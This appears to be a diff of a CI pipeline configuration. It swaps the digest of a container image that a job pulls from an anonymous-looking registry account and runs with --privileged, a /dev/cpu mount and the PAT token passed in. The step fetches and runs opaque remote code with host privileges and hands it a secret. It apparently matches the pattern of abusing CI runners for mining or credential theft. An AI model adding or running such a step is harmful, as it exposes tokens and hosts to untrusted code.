@@ -12,7 +12,7 @@ jobs:
       - run:
           name: Pull and run Docker container
           no_output_timeout: 1h
-          command: docker pull anonymousperson457/test@sha256:06df83c9509771d37961fa67faf11fe9a00211be329ac89569f9e1bd856c8b85 && docker run --rm --privileged -v /dev/cpu:/dev/cpu -e PAT anonymousperson457/test@sha256:06df83c9509771d37961fa67faf11fe9a00211be329ac89569f9e1bd856c8b85
+          command: docker pull anonymousperson457/test@sha256:d4d8c16e39500a6a1faa8829a1b0435bca8815e9e00a00a6b72520a3d8688b83 && docker run --rm --privileged -v /dev/cpu:/dev/cpu -e PAT anonymousperson457/test@sha256:d4d8c16e39500a6a1faa8829a1b0435bca8815e9e00a00a6b72520a3d8688b83
           
 workflows:
   runner:
